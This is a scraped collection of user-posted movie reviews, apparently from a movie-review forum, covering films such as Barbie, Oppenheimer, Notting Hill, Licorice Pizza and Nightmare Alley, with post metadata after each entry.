5. **Dominant but Ambiguous (Cracks in the Ideology)**
6. Documentary 1: Doesn't Question the Real
7. Documentary 2: Shows how Reality is Constructed

I boldened the 5th one because I felt it was most prominent to ""Being There."" To me, the film was a result of the dominant mode of ideology in American culture at the time but was done so in an ambiguous manner where it exposed cracks in the ideology.

I'm curious about what other people think of this film and its meanings. I think it would make for a fascinating discussion. I would also be honored if anyone checked out my GREAT FILM essay/review of it, especially if you want more context of my feelings about the film.

1691130520.0,Barbie: Feminism and Alienation,"**Societal Implications of Iconic Symbolism**

“Barbie,” a comedic portrayal encompassing profound themes such as feminism, capitalism, loss of truth, chaos of relativism, and gender issues, opens with a deliberate allusion to Stanley Kubrick’s renowned 1968 film, “2001: A Space Odyssey.”

Kubrick’s film depicted a moment of enlightenment where prehistoric apes encountered a mysterious black monolith, leading to the realization of using a bone as a tool for dominance. In “Barbie,” this monolith takes the form of an imposing Barbie doll, replete with high heels and a swimsuit, while the apes represent girls who reject traditional gender roles imposed by conventional dolls.

The Barbie doll’s arrival in 1959 marked a significant departure from the prevailing dolls that merely encouraged girls to embrace nurturing motherhood roles. Instead, Barbie presented an image of an independent young adult with her own car and house, challenging the prevailing societal norms. Ruth Handler, Barbie’s creator, instigated a transformative change, influencing the social roles of women through the ideas planted in the minds of young girls. Heeding feminist criticism in the 1970s, Handler diversified Barbie’s roles, depicting her as a fashion designer, doctor, nurse, ballerina, singer, astronaut, and veterinarian.

Nonetheless, this social engineering endeavor produced unintended consequences. Barbie’s unrealistic body measurements promoted an unhealthy standard of beauty, encouraging young girls to strive for unattainable thinness. The doll’s objectification of women propagated harmful notions, reducing them to sexual objects even in the context of children’s innocence. While initially seeking to liberate women, Barbie inadvertently confined them to new social stereotypes, perpetuating unrealistic expectations of perfection, success, power, and extraordinariness.

Erich Fromm’s concept of “alienation” (which is also manifested in historical scriptures), was once more exemplified, with humans becoming enslaved by the very idea they themselves had created — the idol they shaped with their hands. What began as a narrative crafted to reshape society evolved beyond the producer’s control, becoming an instrument of domination.

“Barbie” transcends the realm of superficial feminist propaganda, delving into the chasm between fictional and real worlds. Drawing a parallel to “The Matrix’s” “red pill,” Barbie awakens to the meaninglessness, clichés, and artificiality of her fictional existence. The film exposes the fallacy of perfect men and women in fiction, contrasting them with the imperfections and ephemeral nature of real human beings.

Amidst social pressure to retreat into the comfort of her figurative box, Barbie courageously confronts her existential crisis. Rejecting the notion of being an immortal and flawless “object”, she embraces her mortal and imperfect humanity as an actor (actress in this case). Barbie stands against those who attempt to dictate gender roles and asserts her refusal to be a helpless ordinary character in someone else’s narrative.

Nevertheless, the human quest for “meaning” in “real” life endures, and “meaning” is derived from shared ideas and feelings with others — eluding individual production. As long as societies exist, there will be social engineers crafting fictions that influence human behavior. The perpetual struggle lies in mankind’s battle with the fictions they create, which can, in turn, enslave them.

In conclusion, “Barbie” emerges as a thought-provoking portrayal of feminism as a tool for designing/engineering society and its complex societal implications through symbolic storytelling. The film serves as a reflection of the ongoing human quest for meaning, juxtaposing the allure of constructed fictions with the undeniable reality of human imperfections and mortality.",moviereviews,3854,554,75,0

1691074040.0,"With Oppenheimer, Nolan has killed Hollywood story telling forever.","Oppenheimer is clearly a very bad movie by any authentic standard.

People who love good story telling are confronted with the quandary of the gap between the public perception of the film and the reality that, well, it sucks.I think there are two dimensions.

First, how does the movie manage to create the perception that it is a good film?Second, how is it that a great many people can arrive at the conclusion that this is a good film?

We have to look at how Hollywood has trained audiences to consume and enjoy entertainment. Every ""blockbuster"" movie has a simple formula. Action-Violence-Sex-Quippy Banter. Action-Violence-Sex-Familiar Trope. Action-Violence-Sex-Recognizable Meme.

Wash. Rinse. Repeat. IF in the course of executing this script it just so happens to result in an actual story, then that's nice too.

What Nolan does is he takes that same formula and overlays it onto dramatic subject matter. Oppenheimer and many of his other dramatically themed movies are actionless action movies. He's been doing the same thing since Memento.

He substitutes action with narrative trickery, camera and edits. Cutting around timelines with jarring transitions creates the EFFECT of action. The audience member assumes that something significant has happened because there has been a fast and abrupt change. He uses music and sound effects to emphasize this and further create the EFFECT that something is happening. The scene looks good in terms of production values and cinematography and the actors are appealing and have screen presence, so the EFFECT of something actually happening is further accentuated. It all combines to create the EFFECT that a story is happening, it's dramatic, it's engaging. It MUST be a good movie since it looks and feels and moves like a good movie. And most of all, it appears as though lots of stuff is constantly happening. All of the familiar cues are there.

Sadly, this is the level of consumerism that audiences are at. Mass audiences want DISTRACTION. They want the immersive FEELING that something big is happening. Story is entirely incidental. Nolan is a master at turning drama into action. And with Oppenheimer, he has perfected this mass market recipe.

While many people  would really like to be transported into a great, well crafted story, in Hollywood post-Oppenheimer, that already scarce bird will likely go extinct. Nolan has killed story forever with this film. At least story that comes out of Hollywood (or what's left of it).

This has not been limited to Nolan and has been a growing phenomenon over the last 10 years. Now that I have pointed it out, you will notice the same formula, with variations, in many other films.

Sadly, the overwhelming majority of movie consumers are NPC's. They have a limited range of programmed reactions and that range is a bubble of escape from the fake reality that surrounds their perceptual awareness all day every day. Movies are made for them. They are the numbers. They are the big bucks.

The upside is that Hollywood is done. AI filmmaking will replace Hollywood in the next 3-5 years and then people who want story will be able to get it from people who really want to tell stories. And NPCs will be able to get immersive distraction from the endless stream of that that will be available, or they will just generate it for themselves.

The Hollywood strike is the death rattle of an industry that is a hollowed out shell of itself.",moviereviews,3445,575,74,0

I have a blog reviewing older movies. There are recent movies as well, but it's kind of random what I review. I have a list made up, but whatever movie I watch that isn't on the list, I write a review of it and put it up on the blog as well. It's more of a ""what I feel like at the moment"" kind of movie review blog... Either way, go ahead and read some of the reviews and share the link to the post. It's a good time.

1690993013.0,Watched Notting Hill for the first time and...,"What was all the fuss about? This was a terribly weak and lazy romance. Anna annoyed me on way too many occasions, and overall, she is such a weakly drawn character. The little to no personality of hers is solely defined through her fame, and she has no redeeming qualities whatsoever. She uses her fame to kiss Will out of fucking nowhere after speaking a total of ten sentences or less to him. She flirts and goes on a date with Will whilst having a boyfriend and hides it, which was such a low point for her character (like she is a full-on cheater), and there is not even an attempt at justifying what she did. Will should have seen that moment as a huge red flag and ran for the hills. She runs to Will as a last resort after her photos are leaked and then has the fucking audacity to flip out on *him* about the paparazzi showing up as if he had anything to with it. I mean if anything, William should have been mad at Anna for bringing all of this hubbub into his life. And then she proceeds to talk shit about him behind his back at the movie set (her excuse being she doesn’t want to say the truth about her life to a stranger, like okay but you still did not have to badmouth him). All of the terrible things that Anna does that ends up in Will’s humiliation (like him having to pretend to be a reporter or room service) is expected to be justified because she is famous, I guess. There were so many times where I thought Will is bound to get mad now. But that’s another thing about the movie: WILL NEVER FUCKING STANDS UP FOR HIMSELF or gets truly mad at Anna at any point. I mean yeah there was that moment when he said no to her when she came to him which might I say was such a great decision and I felt so proud of him, like good on you for finally having some self-respect, AND THE MOVIE SHOULD HAVE ENDED THERE. But unfortunately, that great decision only lasted like 40 minutes. Therefore, I did not see the end of the movie as a happy one, but rather a sloppy one. A couple who barely know anything about each other (aside from the fact that Anna is famous, and Will’s nickname used to be “Floppy”), and who (in my opinion) really had no spark going on between them, got married after the woman pulled multiple craps throughout the relationship (can we even call it that??). Is that really a happy ending?

The only thing enjoyable about this movie was Hugh Grant.",moviereviews,2383,456,38,0

1690987958.0,Silenced (2011),"(CW if you wanted to watch the film violence, child exploitation, discrimination)

I watched it earlier and I am speechless and that way maybe one of the most emotional movies I have ever seen. I don’t really know what to say about it because it has left me speechless. The actors did a phenomenal job and there were some plot twists that were kind of expected but it was just aweful. 

The movie revolves around a man who gets a job at a school for deaf children in a rural city in South Korea, he soon discovers the abuse which is inflicted on the students by their teachers. It also shows the unfair laws in the Korean justice system and how corrupt it can be. (The briefest thing I could say about the film)

I enjoyed it but I’m kinda traumatised and this film is also based on a real life event so it’s even more horrific. If you’re interested, do some research on Gwangju Inhwa School for the Deaf.",moviereviews,905,170,11,0
1690907796.0,Was I the only one who didn’t love Oppenheimer?,"Look…I am not trying to be the guy who plays the unpopular opinion. I love Nolan movies, he isn’t my favorite director but a couple of his films fall in my all time list. I just felt like Oppenheimer didn’t leave a lasting impact. The first 45 minutes were great, I loved the way the story was going and was really looking forward to the remainder of the film. Then, I just got thrown so much information, the scenes were rapid firing one after the other, and I had no time to really feel the impact of any scene. It was like the movie was constantly rushing to show me the next sequence and it became annoying. I thought the performances were great and the cinematography was excellent (Never knew New Mexico was so gorgeous). But other than that, the editing and a bit of the story really threw me off. My take was that there was way too much information jam packed into a movie that I will ultimately forget.  

I felt like this would of been better if it were a short series like Chernobyl.

1690932836.0,Why was Hostiles (2017) so hated?,"I LOVED this movie. Yes, it has some pacing issues and a couple flaws. However, this to me is borderline a perfect movie. It had such a heavy tone, story, and soundtrack that hit me in a different place. I’m not even that ecstatic on westerns but Scott Cooper was robbed of an Oscar let alone a positive review here. The cinematography was gorgeous, I thought the writing was solid, and I think this is ONE OF Christian Bales best performances. I have only encountered a few films that really hit me this  deep (The ending of Heat being another).  There were a few moments that had me sitting back in my chair thinking, “Damn that was fucking heavy”. Everyone killed their roles, I think it has a beautiful message and it really made me care for everyone involved.

1690898366.0,Mission: Impossible - Dead Reckoning Part 1,"With *Mission Impossible: Dead Reckoning Part 1*, Cruise and writer-director Christopher McQuarrie have somehow made the action sequences bigger, louder and crazier than before. That’s saying something, considering all of the hair-raising things Cruise’s Hunt did with helicopters in *Fallout*.  Here, Cruise drives his motorcycle over a cliff and desperately tries to get himself and Atwell’s Grace off a train that slowly plummets off a bridge.  There really isn’t anything Cruise won’t do to entertain us, is there?

While Cruise’s devil-may-care attitude towards stunts (and his own life) is vicariously fun, the movie is at its best when it focuses on the people who do the impossible.  Pegg and Rahmes, as always, provide solid relief from the increasingly tense moments.  Klementieff just wants to hurt people and look great doing it.  Kirby’s White Widow wants to eat the world with a spoon, starting with Hunt.  (To my continued dismay, Cruise and the movie never let her.)  *Dead Reckoning Part 1*, as well-made and entertaining as it is, never becomes more than a disposable action movie.  Morales’ Gabriel isn’t much of a villain, and the movie looks a lot like the previous three movies.  The pivot from nuclear destruction to AI-powered destruction is a novel twist, but the payoff is in *Part 2*.  The biggest risk the filmmakers took–making Atwell’s Grace Hunt’s equal and co-lead, works brilliantly.  The pairing of the two and the physical intimacy between them creates a spark that has been missing in this franchise amidst all of the world-saving activities.  More of that, please.  **Recommended**.

1690814037.0,Barbie,"Monday, July 31, 2023.

Barbie
starring Margot Robbie, Ryan Gosling, America Ferrara, Kate McKinnon, Michael Cera, Rhea Perlman and Will Ferrell
written by Greta Gerwid and Noah Baumbach
directed by Greta Gerwig
Rating:  ♦♦♦◊◊

Based on the girls’ Barbie doll from the Mattel corporation, Barbie tells the story of how a generic Barbie doll (Margot Robbie) enters the real world from her fantasy Barbie Land world in order to find the girl whose unhappy thoughts are affecting Barbie’s life in Barbie Land.  She gets advice about how to do it, how to cross that great divide, from Weird Barbie (Kate McKinnon), an aberrant Barbie who was mutilated by too much play, and who subsequently occupies an iconic, mythical status in Barbie Land.  One of the Ken dolls, Beach Ken (Ryan Gosling) tags along to keep her company on the adventure.  But in the real world, Ken is corrupted by toxic masculinity, which he takes back with him to destroy Barbie Land’s perfect, girly dream world.

The Barbie doll has been alternately reviled and praised by different groups.  Some feminists reject her because, they say, the body image of Barbie champions external value over internal value, acting as an insult to feminism.  Femininity and body image are very much linked, as slenderness is associated with elegance and attractiveness, regarded as desirable attributes for young women in western cultures.

On the other hand, Barbie’s advocates say that the doll teaches a much more valuable, body-positive lesson. Mattel tries to inspire girls to test social limits and reach for their dreams, not conform to society.  Mattel has even made Barbies of other races, to prove that it doesn’t matter what background you come from. 

Similarly, right now Barbie is under attack from American political and social conservatives who say that the movie promotes man-hating, woke propaganda, and that it ignores family values and faith communities.  (That is literally a quote from Casey Black, the wife of Conservative Florida Governor and Republican Party Presidential candidate Ron Disantis).  The   opposition is a diverse group, however.  Feminist and right-wing criticisms have nothing at all to do with each other.  Political conservatives are shouting to the wind, trying to create something out of nothing.  That’s their playbook.

Barbie was invented in 1959 by American businesswoman and inventor Ruth Handler (played by Rhea Perlman in the movie).  She named the toy after her own daughter, Barbara.  Handler’s motivation was that in the 1950s, only baby dolls were available to girls to play ‘mommy.’  But she saw her daughter and her friends imitating adult women in their play.  So, Barbie was designed as an adult figure (albeit with a very unrealistic body) who could do everything that most women of the time could not do.  Barbie was an active girl.  She drove a car; she assumed every job imaginable; she came in different hair colors and races; she even had a credit card long before real human women were allowed to have their own credit cards.

I tend to favor the pro-Barbie position, because the anti-Barbie position just takes a plastic toy way too seriously and uses her in their ideological arguments in a manner that lacks credibility.  It’s stupid (and dull), and I regard intelligence over stupidity.",moviereviews,3309,539,67,0

1690791328.0,"Ron Pearlman and ""The Baker"" ruined my Sunday","When my friends invited me out to see ""The Baker"", my expectations were already pretty low, but nothing could have prepared me for how terrible this movie and performance was.

From the premise of the film, *An elderly baker must do everything he can to save his missing son and protect the granddaughter he never knew existed from mob hitmen,* I could tell this was going to be nothing more than a ""Taken"" rip off. How a slightly above average action movie like ""Taken"" can pretty much create a whole genre of movies looking to recapture it's success is beyond me, but here we are.

Despite the low expectations, I was blown away with how bad this film was. The best part of this film, was the acting by Joel David Moore, who unfortunately dies 20 minutes into the movie. The rest of the film is plague by Ron Pearlman attempting to perform convincing action scenes where he takes out multiple skilled hitmen, and by his lack of range despite the circumstances that he's in. The monotone, stoic, emotionless acting by Pearlman is almost made worse when you pair him with a mute little girl as his co star.

Aside from the acting, this movie does absolutely nothing to keep you engaged. No back story, no character development, no reason to care at all. The little girl in the movie does have some good moments, where you find yourself caring slightly about her as a character, but the fact that she doesn't speak and has no back story essentially, diminishes any investment you have in this character.

With all of these negatives,(bad acting, bad story) you would HOPE that the action would be good. However, it is VERY underwhelming. Pearlman is unconvincing in this role, and not once did any of these encounters of killing multiple hitmen at once make any sense. There's a part where he's being jumped outside of a night club, and the scene ends with him killing a guy buy just kicking him somewhere. I only say it like this, because I have no idea where he kicked the guy. Like most of the action scenes in this film, low lighting was used, that made the overall scenes very hard to see. This was probably done because of how old Pearlman looked doing these scenes, but regardless I think it was pretty bad.

After wasting almost 2 hours watching this nonsense, an old man killing multiple hitmen, connecting them by loose clues over the course of 2 days, all to eventually figure out the person behind his sons death was a guy he used to work for LOL. I don't get why he never once thinks his old drug kingpin boss could be behind killing his son for the large amount of drugs he had. Not once, until the very end when someone mentions his old boss by name coincidently, does he even think to put 2 and 2 together. SMH, and finally the movie ends with Pearlman returning the drugs, and going on his way with almost no words (or acting) involved at all.

Please do yourself a favor, and skip this film by all means. Even if you're a Regal Unlimited member like me, it is not worth the points. See Barbie instead.

You'll thank me later haha.

Oppenheimer
starring Cillian Murphy, Emily Blunt, Matt Damon, Robert Downey, Jr., Florence Pugh, Josh Hartnett, Casey Affleck, Rami Malek and Kenneth Branagh
screenplay by Christopher Nolan
directed by Christopher Nolan
Rating:  ♦♦♦♦◊

	Of course, I’ve known who Robert Oppenheimer was since early high school.  The father of the atomic bomb, the man appointed to manage the Manhattan Project during the Second World War.  The Manhattan Project involved research at various universities and military installations across the United States.  It took three years to create the Bomb.  It involved about 4,000 people, and it cost about $2 billion US ($34 billion US in today’s dollars).  Work was centered in Los Alamos, New Mexico where the first prototype atomic bomb was detonated in July 1945.  When the project was successfully finished, it wasn’t just a new weapon that Oppenheimer and his team had created.  It was a new world.  
I’ve been interested in the atomic bomb since I read John Hershey’s 1946 book Hiroshima while preparing an essay on the Hiroshima bombing for my Grade 9 History class with Mr. Chapman.  I re-read Hiroshima just two years ago.
To prepare for the movie, I watched a couple documentaries about Robert Oppenheimer and the Manhattan Project, plus I watched some educational shorts on YouTube, including interviews with the man himself.  There’s no doubt in my mind that J. Robert Oppenheimer, although brilliant, was a really weird guy with a complex psychology.  Oppenheimer was famously accused of being a Communist during the Red Scare at the start of the Cold War, enduring excruciating hearings before the Atomic Energy Commission and subsequently losing his security clearance to work on government defense projects.  I suspect that his personality cultivated his own persecution at the hands of America’s security apparatus (like how Galileo cultivated his persecution in the 17th century).


Oppenheimer embodied the age-old question of whether doing harm to lessen overall harm is, in the end, more good than bad.


In the film, Matt Damon’s character, Gen. Leslie Groves (Oppenheimer’s immediate boss), described him as “A dilettante, a womanizer, a suspected communist, unstable, theatrical, egotistical, neurotic.”  After researching him a bit, I kind of feel that isn’t terribly inaccurate.  Oppenheimer was conflicted between two or three strong opinions about the implications of his work in the context of the World War  -  a kind of moral paralysis that at some point ceases being intelligent and becomes just annoying and boring.  Boring!!  After the defeat of Germany, the invasion of mainland Japan promised unacceptably high mortality to a nation that was tired of four years of costly war.  The Americans wanted to end the conflict fast.  So, Oppenheimer embodied the age-old question of whether doing harm to lessen overall harm is, in the end, more good than bad.  He was like an American Prometheus in that, like the mythical God of Fire, he gave the US this gift of   the power of the atom in the form of technology and knowledge.  Once the power genie was lose, it could never be put back in the bottle.  I mean, once the know-how is out there, it’s out.  And once out, it instantly evaded the control of the scientists who created it.
Oppenheimer featured a fantastic ensemble cast.  David Krumholtz, Gustaf Skarsgard  -  another Skarsgard family member.  How many Skarsgards are there?  The Skarsgards are like the Carradine brothers, or the Baldwin brothers in America.  Jack Quaid as Richard Feynman, and Gary Oldman as Pres. Harry S. Truman, and more.  When I saw and recognized Matthew Modine’s face I couldn’t believe it, and I had to check the credits to be sure it was really him!  And David Krumholtz, too.  Wow!

It wasn’t just a new weapon that Oppenheimer and his team had created.  It was a new world.",moviereviews,3894,634,95,0
1690766259.0,Thoughts on Planes 2013," 

Planes (2013) is one of the worst animated films I have ever seen. It’s boring, it’s lazily written, the characters are bland as hell, and the plot is just a rip off of Cars. The animation is inconsistent and sloppy, it uses models similar to those seen in Cars except that they clearly had way less detail and effort put in to how they look. The lighting in this movie is pathetic, not one scene looks like you’d expect. This is especially jarring in an animated film, where lighting is done purely in the editing software. Not one character was memorable, I only remember a single character’s name after just watching it, and that is because they repeat it over and over. Each scene meanders on and on, and it never seems like the torture this movie puts you through will come to an end. If I had to choose between pouring salt into an open wound or drinking the liquid found at the bottom of a trash can over watching this movie, I would gladly choose the former. Stay far away from this movie, it is not worth anyone’s time or god forbid money.

Strengths: The Mexican plane sings a song thats good, the scene where all the planes get shot down in the flashback.

Weaknesses: Everything else

Characters I liked: none

1690573120.0,Movie review: Licorice Pizza (2021),"Strong debut performances from rookie leads make this summer-love romp down memory lane a treat, even if PTA is having a little too much fun at times.

Pro's: 

There are certain directors that are able to make places, not just actors, characters in their films. Martin Scorsese has New York, Sergio Leone had the wild west, and Paul Thomas Anderson has California. That's where his latest effort, Licorice Pizza, takes place. Not modern day, sushi and tech startup California, but the 1970s, vinyl and cigarette California of his childhood. And it comes as no surprise that this movie draws from his and his friends' experiences. A very personal touch permeates the film; you can feel the nostalgia and reminiscence dripping off the screen. (Even the poster is a throw-back to the illustrated film posters of the era). Pleasant stand-outs are the 2 leads, Alana Haim's Alana and Cooper Hoffman's Gary. Both newcomers making their feature debuts, they put in surprisingly capable performances as on-again, off-again, flirting/fighting kids (or in Alana's case, young adult) running around southern California navigating their lives. They come off as refreshingly naturalistic, displaying an ease in front of the camera well beyond their experience. Hoffman, son of the late Philip Seymour Hoffman, could have easily come off as a disappointing example of nepotism in Hollywood. And with those shoes to fill any actor could be forgiven for failing to live up to that legacy. While not an astoundingly masterful performance, he manages to pull off his first film (and lead role) with grace and often times charm to spare. A cameo/ barely-supporting role from Bradley Cooper provides a fun detour. It's a fun trip to a time and place gone by, and it doesn't shy away from pulling over and enjoying the scenery when it pleases.

Cons:

If all this is sounding a little familiar, that's because it is. Anderson has made a movie in this wheelhouse before, and his first go at this period California joyride is the better film. It will be hard for Licorice Pizza to escape comparisons to Boogie Nights, and to an extent a little unfair. Boogie Nights explores much darker territory and is more plot-driven, and a 1-to-1 comparison isn't necessarily called for. But when a skilled director invokes a specific time and place twice, both based on real events, it's hard to ignore the other. Boogie Nights is a better film partly because it's simply a great film and one of Anderson's best, and so it would outshine several other of his movies too. But it's also partly because Licorice Pizza never quite comes together the way Boogie Nights does. (Once Upon a Time in Hollywood, another 1970's California hangout movie, is also called to mind, and also does better.) Boogie Nights has a cohesiveness and momentum to it that Licorice Pizza lacks. You can say that's because Boogie Nights is more plot-driven, but OUATH is just as meandering and character-driven as Licorice Pizza, yet manages to come together and carry you through the story at pace, supporting its own weight. Licorice Pizza meanders and wanders a little too much for its own good. It also takes its time getting off the ground; things don't quite start picking up until Bradley Cooper's appearance, and that's halfway through the movie. There's a slight lack of focus here that Anderson has given us in his previous work that could have tightened this up and kept it more on track. As a side-note, there's a slight question viewers may be left with concerning Hoffman's character's habit of owning and operating several businesses as a minor. Not quite a plot hole, but definitely a curious plot point that stretches the believability just a little.

Bottom Line: Paul Thomas Anderson indulges in a rose-colored-glasses induced trip down memory lane in this charming and fun romp, featuring stand-out performances by two newcomers who make a promising debut. The film could stand to focus a bit more and tie things together as it winds down the sunny streets of the San Fernando Valley, and there are other movies that have explored this territory better, including one of his own, but you'll leave satisfied and charmed nonetheless. 7.5 stars out of 10.",moviereviews,4212,705,104,0
1690530639.0,Oppenheimer (2023) - Not quite the bomb,"**“Oppenheimer” is an experiment in whether a movie can be carried by a series of impressive moments. While not delivering a visionary piece of storytelling, writer and director Christopher Nolan leaves us with a testament to his ability to wring emotion and a sense of profoundity out of any scene through music and visuals alone.** 

The movie tells the story of the father of the atom bomb, Robert J. Oppenheimer (“the J. doesn’t stand for anything”). The story is presented in a way which combines the traditional “biopic” with Nolan's favoured tool of non-chronological storytelling. The main thread of the story is Oppenheimers work to construct the atom bomb through the Manhattan project and the interpersonal drama surrounding it. 

We are shown a troubled genius with left-wing leanings in a right-wing age, yet who is still charged by the military to lead a scientific project with a horrific potential to change - or destroy - the world. The story mixes sober, matter-of-fact scenes in graytones with vivid and colourful scenes blurring the lines between reality and Oppenheimers chaotic inner life. Combined with the jumps in time, we are given a glimpse of the world as Oppenheimer himself may have perceived it – A jumbled mess of thoughts, memories, impulses and strong emotion. At a point, a colleague comments that nobody knows what Oppenheimer is actually thinking. In the distressed eyes of leading actor Cillian Murphy, we see a man that suspects he does not even know the answer himself. 

With the audience already knowing the result of the Manhattan Project, the story derives its tensions from the questions surrounding the main character. Does he feel guilt over the destruction he causes, potentially to humanity and certainly to the people closest to him? Will he be condemned by a government that no longer needs him once the bomb is delivered? Is he a calculating egomaniac or a naïve egghead? Is he even emotionally equipped to navigate an ordinary friendship or family life? Despite its monumental runtime of three hours, these questions are only addressed at a surface level – The movie simply has too much to say. Images of political hearings, sad eyes on the couch at home, arguments in the lab and conversations in the park breeze by, but are rarely given the time to linger. Quotes and moments of symbolism which might have been central to the identity of other movies are delivered quickly before the script rushes on to the next piece of biographical information. We see every moment of Oppenheimers life, but are ironically left with very little sense of the man himself beyond what is conveyed by the visuals. There are truckloads of characters, but few moments of real connection. Perhaps this is true to the man himself. It might also, however, imply that the script could have used some more challenge and review along the way. 

The movie is rescued by a series of strong acting performances. Emily Blunt as Oppenheimers wife and Florence Pugh as his lover both convey a whole life-story with an absolute minimum of screen time, and the music of composer Ludwig Göransson combines with impressive visuals to make several scenes of the movie feel profound and meaningful in a way that few other directors carry off. As the apocalyptic final scene peters out into the credits, we are left with a sense of having witnessed something epic. As I wake up today with some more distance, I suspect this movie will leave less of a long-term mark than most of Nolan's previous films.

1690478871.0,Movie review: Nightmare Alley (2021),"Nightmare Alley: Del Toro proves his noir chops are just as worthy as his creature-feature chops in this fever dream thriller.

PROS: 

With a packed lineup of leads touting the likes of Cate Blanchette, Rooney Mara, Toni Collette (continuing here her late-career renaissance), and Willem Dafoe, Bradley Cooper puts in a strong enough performance to anchor this solid cast. His Stanton Carlisle is enigmatic, charismatic, a quick-study hustler who holds his own in any room (or circus tent) he's in. Cooper manages to layer contradictions on top of each other with grace, at once scrappy and polished, desperate and composed, hungry and laid-back. Throw in Cate Blanchette as a femme-fatale who may be the only person who can match him, and you have a powder keg of a film. Trust veteran director Guillermo del Toro to walk this razor's edge for much of the runtime, heightening and then sustaining the tension, flexing his horror/thriller experience when necessary to keep the audience peaking around every corner. And since this is del Toro, you can bet the set design is dripping with every little detail to build this WW2 dustbowl-era world. His signature greenish tint is cast over much of the proceedings when they aren't doused in old-west sepia tones. The visual design goes deeper here too, from the woodgrain in Blanchette's Dr. Ritter's office resembling ink blot patterns and tarot card imagery weaved into the nooks and crannies of the frame, to the film's themes of sin and guilt manifesting in carnival rides and attractions. Curiously, del Toro skews into some new territory here stylistically, lacing touches of film noir into his mid-century thriller. The ingredients are all there: the dangerous dame, a job gone wrong, a 30's and 40's setting, Cooper's Stanton Carlisle doubling as both con-man and detective. What's a relief is that del Toro's first flirtation with this genre is largely successful, and adds another layer of suspense to play with. The fact that Cooper doesn't get swallowed up by the bevy of talent surrounding him is testament to his performance. A lesser actor would have had the show stolen by any of the other leads. Blanchette's Dr. Ritter is sinisterly seductive and convincing as a match to our carney lead, while Dafoe's jaded carnival boss leaks apathetic evil through every pour, perhaps most on display in a particularly bleak scene in which he pridefully explains his method of exploiting and discarding homeless drunks like so many peanut shells to an astonished Cooper. Nightmare Alley invites the audience to step right up and be lured into the beer and rain-soaked abyss, and del Toro makes sure to provide a gripping payoff well worth the price of admission.  


CONS: 

Not many films that step over the 2 hour mark can justify the run-time. And even a film as carefully crafted and well-executed as this can be guilty of that. The middle starts to drag just ever so slightly as the plot thickens and the stakes raise for Cooper and Mara. The WW2 backdrop of the film, which del Toro is sure to remind the audience of with radio and newspaper references a few times (""Did ya hear that little man with the mustache invaded Poland?"" Dafoe's Clem Hoatley asks, seemingly irrelevant to anything going on.) never seems to intersect or connect with our story or our characters. It reminds one of movies that take place in the 70s and any time a character turns on a TV or the radio Nixon is giving a speech. If there was a thematic point being made here, it's lost in the jumble. Del Toro fans will also appreciate a supporting role appearance by Ron Perlman as carnival strongman Bruno. And while he's perfectly serviceable in his role, he's shown up in so many of his movies at this point that you can almost here the ""Ron Perlman"" box being ticked on everyone's Guillermo del Toro film bingo sheet. A minor distraction, but worth noting. As for Cooper, perhaps the only cracks in his armor are found in the script and not his acting. Carlisle Stanton is presented to us as the slyest fox alive, a born con-man who knows every move and has been down every block. And yet when Dr. Ritter shows up and the audience immediately clocks her as a threat, somehow Stanton doesn't. You can chalk this up to her seductive ways, but it seems that if we can see this snake coming a mile away, certainly the Don Draper of con-men would.  


BOTTOM LINE: An ensemble cast giving ""A"" performances drives this thriller from strength to strength, mesmerizing and beguiling the audience as Bradley Cooper beguiles his marks. Del Toro trods new ground here, and proves film noir is every bit his wheelhouse as monster flicks and horror romps. A spot of editing could tighten up this film and squeeze out another drop or two of suspense in doing so, but you'll be having too much fun to notice. An admirable job by both cast and director, Nightmare Alley is a dream of a thriller sure to entertain to it's last scene. A scene which will haunt you long after the carnival has packed up and rolled on to the next town. 8.5 out of 10 stars.",moviereviews,5071,879,112,0

1690349050.0,"Two hours into Oppenheimer, it's horrible","I'm writing this review in the middle of watching this absolutely atrocious film. I usually let some time pass  before completely giving up on a movie. However, this is just such a let down. How is it this bad? Barbie was much better. Sometimes the dialogue here is cheesier than it is in that movie. I literally don't think it's going to get any better. I'm watching with a friend, we're both students and we can't keep up with the dialogue. I can't imagine how it would be for anyone new to physics. I think I'm about to leave this theater because I can't handle any more old greasy men talking absolute nonsense to an extremely confused audience. Unnecessary nudity, dialogue, and scenes. Acting is the best part of the movie

Edit: I ended up staying until the end of the film. The last section was much better but I still felt like it was incomplete. It was lacking the emotional buildup that interstellar for ex. mastered. By the end of it, I couldn't care less about the main character or the story. I still can't believe that the r rating was due to sex and not gore or violence. Why weren't there more scenes about the impacts of the bomb on Japanese citizens?? It would have made oppy's guilt hit even harder and made the audience question the morality of the bomb more. The sound quality was also atrocious, no one I knew heard what he said to Einstein at the end.",moviereviews,1375,253,41,0
1690362435.0,Barbenheimer,"Both movies were shiny, competently done... but fell short in many ways.

Spoilers ahead. (Reference note: 5/10 ~ average, not bad)

Oppenheimer - 4/10; please stop with the freaking music.

Oppenheimer attempts nonlinearity, juxtaposing snapshots of Op's life to focus our attention on details in different scenes, or to bring new insight to a scene - usually replayed, from a different point of view.  Yet the plot also moves linearly through his life.  This isn't the most surprising editing in 2023, but did help hold together an otherwise frenetic plot.

There's not much to say here.  This movie felt like it was supposed to be good, but it just wasn't there.  The pieces do come together towards the end, climaxing in... Robert Downey Jr not getting a cabinet appointment, when a scientist unexpectedly backs Op.  I watched a movie about Op for that??  However, the movie had good scenes, especially when they turned off the music.  Is this f***ing Hans Zimmer?

The music took off like 1 or 2 points for me.  It rarely made sense, and overall doesn't make sense for the movie.  Sometimes I felt like I was watching actors, not characters, but I can't tell if that's just bc the freaking music ruined the immersion and quality of scenes.  But it did frequently feel kinda corny, kinda contrived

Barbie - 3/10; Barbie is exactly what I expected.  It pulls no punches in its messaging, and is frequently explicit, lecturing.  I came to see a movie, but the message itself was delivered accessibly, and integrated well, veering on the edge of well-done propaganda.  This is, on my impression, where both the love and hate for the movie come from.  It has a bombastic presence on the screen, and is great at keeping your eyes glued.  I am reminded of ""300"".

Yet it's storyline is boringly predictable, and it sustains attention w it's flashy aesthetic and gorgeous actors, crass American humor, relatable scenarios, and controversial quips.  Unless the messaging of the movie is what you're there for (to love or hate), these flaws drag the movie down, enticing zoning out, staring blankly at the beautiful people in soft matte pinks.  Pacing was good.  Big speeches and punchy quips dot the movie, like one of those high school football movies.  Thats all for the movie rating.  But it's worth making a further remark...

Actually, the storyline is not entirely predictable.  That the company board remained all male, that Gloria's idea was put down by the (white male) CEO until someone observed her idea was profitable, and that both Barbieland and the real world conserve their respective matri/patriarchy implies that almost nothing happened in the movie.  What did feminism actually do?  Mobilize everyday acts of resistance to prevent constitutional reform?  Do women actually divide and conquer men by making them jealous?

